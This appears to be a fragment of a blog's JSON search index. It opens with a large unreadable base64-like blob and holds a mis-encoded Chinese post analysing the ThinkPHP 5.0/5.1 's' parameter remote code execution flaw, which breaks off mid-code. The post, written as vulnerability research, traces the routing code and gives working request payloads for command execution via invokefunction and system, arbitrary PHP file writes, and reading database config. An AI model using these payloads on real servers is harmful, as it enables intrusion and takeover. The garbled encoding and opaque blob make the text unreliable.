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"},{"title":"ã€Code Analysisã€‘thinkphp v5.x App.php så‚æ•°RCE","permalink":"http://blog.0kami.cn/2019/02/05/thinkphp-v5-x-App-php-rce/","text":"æ¦‚è¿°æ”¾å‡äº†ï¼Œå¯¹thinkphpçš„å‡ ä¸ªRCEåšä¸€ä¸‹åˆ†æï¼Œè®°å½•ä¸€ä¸‹XD thinkphp v5.0.xæ¼æ´ç›¸å…³ä¿¡æ¯æ¼æ´ç‰ˆæœ¬ï¼š&lt;= 5.0.22è¡¥ä¸ï¼šç‰ˆæœ¬æ›´æ–° Â· top-think/framework@4cbc0b5 Â· GitHubé—®é¢˜ç‚¹ï¼šlibrary/think/App.php æ¼æ´åˆ†æå…³äºthinkphpçš„urlè§£ææ–¹å¼THINKPHPæ”¯æŒä½¿ç”¨PATHINFOçš„æ–¹å¼æ¥è®¿é—®å…·ä½“çš„æ¨¡å—ã€ç±»ã€æ–¹æ³•ï¼Œå¦‚index.php/module/controller/actionå¯¹äºä¸æ”¯æŒPATHINFOçš„æœåŠ¡å™¨ï¼ŒTHINKPHPæä¾›äº†å…¼å®¹æ¨¡å¼?s=/module/controller/actionçš„æ–¹å¼æ¥è®¿é—®è€Œè¿™æ¬¡çš„æ¼æ´æˆå› å°±æ˜¯åœ¨äºå…¼å®¹æ¨¡å¼å¤„ç†æ—¶å­˜åœ¨çš„é—®é¢˜ã€‚é¦–å…ˆçœ‹ thinkphp/library/think/Request.phpçš„pathinfoå‡½æ•° 123456789101112131415161718public function pathinfo()&#123; if (is_null($this-&gt;pathinfo)) &#123; if (isset($_GET[Config::get('var_pathinfo')])) &#123; // åˆ¤æ–­URLé‡Œé¢æ˜¯å¦æœ‰å…¼å®¹æ¨¡å¼å‚æ•° $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')]; unset($_GET[Config::get('var_pathinfo')]); &#125; elseif (IS_CLI) &#123; // CLIæ¨¡å¼ä¸‹ index.php module/controller/action/params/... $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : ''; &#125; // åˆ†æPATHINFOä¿¡æ¯ ... $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/'); &#125; return $this-&gt;pathinfo;&#125; å½“GETè¯·æ±‚ä¸­å¸¦æœ‰så‚æ•°(configä¸­é»˜è®¤var_pathinfoä¸ºs)ï¼Œå°†pathinfoè®¾ç½®ä¸ºsçš„å‚æ•°å€¼æœ‰äº†pathinfoå€¼ï¼Œæˆ‘ä»¬å†æ‰¾åˆ°å…·ä½“çš„è§£æurlçš„å‡½æ•°ï¼Œthinkphp/library/think/Route.phpçš„parseUrlå‡½æ•°123456789101112public static function parseUrl($url, $depr = '/', $autoSearch = false)&#123; if (isset(self::$bind['module'])) &#123; $bind = str_replace('/', $depr, self::$bind['module']); // å¦‚æœæœ‰æ¨¡å—/æ§åˆ¶å™¨ç»‘å®š $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr); &#125; $url = str_replace($depr, '|', $url); list($path, $var) = self::parseUrlPath($url); $route = [null, null, null]; // ...&#125; å…¶ä¸­parseUrlå‡½æ•°çš„$urlä¸ºä¸Šé¢æ‹¿åˆ°çš„pathinfoï¼Œ$deprä¸ºé»˜è®¤çš„åˆ†å‰²ç¬¦é¦–å…ˆå¯¹$urlæ›¿æ¢åˆ†å‰²ç¬¦ä¸º|ï¼Œå†è¾“å…¥åˆ°parseUrlPathå‡½æ•°(æ ¹æ®/åˆ†å‰²)ï¼Œè¯¥å‡½æ•°å¯¹pathinfoè¿›è¡Œåˆ†å‰²ï¼Œäº§ç”Ÿmoduleã€controllerã€actioné‚£ä¹ˆç°åœ¨æ¥çœ‹rceçš„Poc?s=/index/\\think\\app/invokefunction=&gt;[module:index,controller:\\think\\app,action:invokefunction]å…¶ä¸­controller=&gt;\\think\\appï¼Œæ˜¯phpå‘½åç©ºé—´çš„è¡¨ç¤ºæ–¹å¼ï¼Œ\\think\\appå®é™…è°ƒç”¨library/think/App.phpï¼Œåé¢çš„actionå®é™…è°ƒç”¨çš„App.phpä¸­çš„invokefunctionå‡½æ•° æ¼æ´æˆå› ç‚¹ä¸Šé¢åˆ†æäº†thinkphpçš„å…¼å®¹æ¨¡å¼æ˜¯å¦‚ä½•å¤„ç†så‚æ•°çš„ï¼Œå¹¶ä¸”å¤„ç†å­˜åœ¨ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¯ä»¥ä¼ªé€ controllerï¼Œå¯¼è‡´å®é™…è°ƒç”¨ä¸ºå…¶ä»–çš„ç±»å’Œå‡½æ•°çœ‹ä¸€ä¸‹æ‹¿åˆ°moduleã€controllerã€actionåç³»ç»Ÿçš„å¤„ç†thinkphp/library/think/App.php çš„ moduleå‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public static function module($result, $config, $convert = null)&#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); ... // è®¾ç½®é»˜è®¤è¿‡æ»¤æœºåˆ¶ $request-&gt;filter($config['default_filter']); ... try &#123; $instance = Loader::controller(// å®ä¾‹åŒ–controllerç±» $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // è·å–å½“å‰æ“ä½œå $action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // æ‰§è¡Œæ“ä½œæ–¹æ³• $call = [$instance, $action]; // ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // ç©ºæ“ä½œ $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // æ“ä½œä¸å­˜åœ¨ throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars);// è°ƒç”¨å‡½æ•°&#125; æ‹¿åˆ°å®ä¾‹åŒ–åçš„å¯¹è±¡å’Œæ–¹æ³•ï¼ŒåŠ¨æ€è°ƒç”¨invokeMethod12345678910111213141516public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // é™æ€æ–¹æ³• $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars);// è·å–å‚æ•°å†…å®¹ è¿™é‡Œè·å–åˆ°å‚æ•°ç”¨åšmethodçš„å‚æ•°è¾“å…¥ self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125; è¿™é‡Œä½¿ç”¨bindParamså‡½æ•°ä»getæˆ–postä¸­è·å–åˆ°å¯¹åº”çš„å†…å®¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåšå‚æ•°åµŒå…¥æ—¶ï¼Œéœ€è¦ä»¥å‡½æ•°çš„å‚æ•°åä¸ºé”®å¦‚invokeFunctionçš„å‚æ•°ä¸º$functionã€$varsï¼Œé‚£ä¹ˆåœ¨å‚æ•°ä¸­å°±éœ€è¦ä»¥function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxxå³pocçš„ååŠéƒ¨åˆ†function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-læ‰€ä»¥è°ƒç”¨é“¾ç°åœ¨å˜æˆäº† åŠ¨æ€è°ƒç”¨\\think\\app invokeFunctionå‡½æ•° æä¾›function=call_user_func_arrayä½œä¸ºinvokeFunctionåŠ¨æ€è°ƒç”¨çš„å‚æ•°ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥è°ƒç”¨call_user_func_arrayå‡½æ•° call_user_func_arrayçš„å‚æ•°ä¸ºsystemå‡½æ•°ï¼Œsystemå‡½æ•°çš„å‚æ•°ä¸ºls -lï¼Œæ‰€ä»¥è¿™é‡Œç”¨äº†2ç»´æ•°ç»„ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‘æ•£ä¸€ä¸‹æ€ç»´ï¼Œæˆ‘ä»¬å…¶å®ä¸å•å•å¯ä»¥è°ƒç”¨\\think\\appè¿™ä¸ªç±»ï¼Œå¦‚æœå…¶ä»–çš„ç±»å¯ä»¥ä»»æ„è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œæˆ–è€…æ˜¯è°ƒç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ŒåŒæ ·å…·æœ‰å±å®³æ€§å¦‚ä»»æ„å‘½ä»¤æ‰§è¡Œ?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œç”Ÿæˆåœ¨index.phpåŒä¸€çº§ç›®å½•?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();è·å–é…ç½®ä¿¡æ¯?s=index/\\think\\config/get&amp;name=database.username thinkphp v5.1.xç‰ˆæœ¬ä¿¡æ¯ç‰ˆæœ¬ï¼š&lt;= v5.1.30è¡¥ä¸ä¿¡æ¯ï¼šä¿®æ­£æ§åˆ¶å™¨è°ƒç”¨ Â· top-think/framework@802f284 Â· GitHubæ¼æ´ç‚¹ï¼šthinkphp/library/think/route/dispatch/Module.php æ¼æ´åˆ†æåŸç†åŒv5.0.xç‰ˆæœ¬ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±äºså‚æ•°å¸¦å…¥çš„è·¯å¾„è§£æå­˜åœ¨å®‰å…¨é—®é¢˜å¯¼è‡´çš„ä»»æ„ä»£ç æ‰§è¡Œå…ˆçœ‹App::run()1234567891011121314151617181920212223242526272829303132333435public function run()&#123; try &#123; // åˆå§‹åŒ–åº”ç”¨ $this-&gt;initialize(); ... $dispatch = $this-&gt;dispatch; if (empty($dispatch)) &#123; // è·¯ç”±æ£€æµ‹ $dispatch = $this-&gt;routeCheck()-&gt;init();// å¤„ç†moduleã€controllerã€action &#125; // è®°å½•å½“å‰è°ƒåº¦ä¿¡æ¯ $this-&gt;request-&gt;dispatch($dispatch); ... &#125; catch (HttpResponseException $exception) &#123; $dispatch = null; $data = $exception-&gt;getResponse(); &#125; $this-&gt;middleware-&gt;add(function (Request $request, $next) use ($dispatch, $data) &#123; return is_null($data) ? $dispatch-&gt;run() : $data; &#125;); $response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);// åŠ¨æ€è°ƒç”¨controllerã€action ... return $response;&#125; App::run()å‡½æ•°ä½“ç°äº†ç¨‹åºçš„ä¸€ä¸ªä¸»è¦æµç¨‹ï¼Œä»è·¯å¾„çš„è§£æåˆ°åŠ¨æ€è§£ææ‰§è¡Œç›¸åº”çš„æ§åˆ¶å™¨åŠæ–¹æ³•å…ˆæ¥çœ‹çœ‹ç¬¬13è¡Œï¼Œè·å–ç›¸åº”çš„è·¯å¾„ä¿¡æ¯thinkphp/library/think/App.php routeCheck()å‡½æ•°1234567891011121314151617181920public function routeCheck()&#123; // æ£€æµ‹è·¯ç”±ç¼“å­˜ ... // è·å–åº”ç”¨è°ƒåº¦ä¿¡æ¯ $path = $this-&gt;request-&gt;path(); // ä»Request.php pathæå–urlpath å…·ä½“ä»pathinfo()ï¼Œä¼˜å…ˆè·å–$_GET[$this-&gt;config['var_pathinfo']] // var_pathinfo é»˜è®¤ä¸ºs // æ˜¯å¦å¼ºåˆ¶è·¯ç”±æ¨¡å¼ $must = !is_null($this-&gt;routeMust) ? $this-&gt;routeMust : $this-&gt;route-&gt;config('url_route_must'); // è·¯ç”±æ£€æµ‹ è¿”å›ä¸€ä¸ªDispatchå¯¹è±¡ $dispatch = $this-&gt;route-&gt;check($path, $must);//è¿”å›UrlDispatchç±»å®ä¾‹ï¼Œä»dispatchç±»å¤„ç»§æ‰¿ ... return $dispatch;&#125; ç¬¬7è¡Œä»så‚æ•°ä¸­è·å–è·¯ç”±è·¯å¾„(sä¸ºvar_pathinfoçš„é»˜è®¤å€¼)ï¼Œåœ¨è°ƒç”¨routeCheckå‡½æ•°åè¿”å›ä¸€ä¸ªUrlDispatchï¼Œä¹‹åè°ƒç”¨äº†Urlç±»çš„initå‡½æ•°thinkphp/library/think/route/dispatch/Url.php init12345678public function init()&#123; // è§£æé»˜è®¤çš„URLè§„åˆ™ $result = $this-&gt;parseUrl($this-&gt;dispatch); // parseUrlå‡½æ•°å¤„ç†å‚æ•°å€¼(ä»¥/åˆ†å‰²ï¼Œä¼ å…¥|ä¹Ÿè¡Œä¼šè¢«æ›¿æ¢æˆ/ï¼Œæœ€ç»ˆç”±/æ¥åˆ†å‰²)ï¼Œè¿”å›[module,controller,action] return (new Module($this-&gt;request, $this-&gt;rule, $result))-&gt;init();&#125; è¿”å›Moduleå¯¹è±¡ï¼Œç»§æ‰¿è‡ªDispatchå¯¹è±¡ï¼Œå¹¶ä¸”è°ƒç”¨äº†initå‡½æ•°ï¼Œå°†è§£æåçš„è·¯ç”±å¡«å……åˆ°dispatchï¼Œä¾›åé¢App::run()å‡½æ•°åŠ¨æ€è°ƒç”¨dispatchçš„runå‡½æ•°ï¼Œv5.1ç‰ˆæœ¬çš„è°ƒç”¨é“¾å¤æ‚äº†ä¸€ç‚¹ï¼Œä½†æ˜¯å…¶å®å†…å®¹åŒv5.0ç‰ˆæœ¬ç±»ä¼¼Dispatch::run()å‡½æ•°è°ƒç”¨äº†Module::exec()å‡½æ•°thinkphp/library/think/route/dispatch/Module.php exec()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public function exec()&#123; // ç›‘å¬module_init $this-&gt;app['hook']-&gt;listen('module_init'); try &#123; // å®ä¾‹åŒ–æ§åˆ¶å™¨ $instance = $this-&gt;app-&gt;controller($this-&gt;controller, $this-&gt;rule-&gt;getConfig('url_controller_layer'), $this-&gt;rule-&gt;getConfig('controller_suffix'), $this-&gt;rule-&gt;getConfig('empty_controller')); if ($instance instanceof Controller) &#123; $instance-&gt;registerMiddleware(); &#125; &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; // é—­åŒ…è°ƒç”¨ $this-&gt;app['middleware']-&gt;controller(function (Request $request, $next) use ($instance) &#123; // 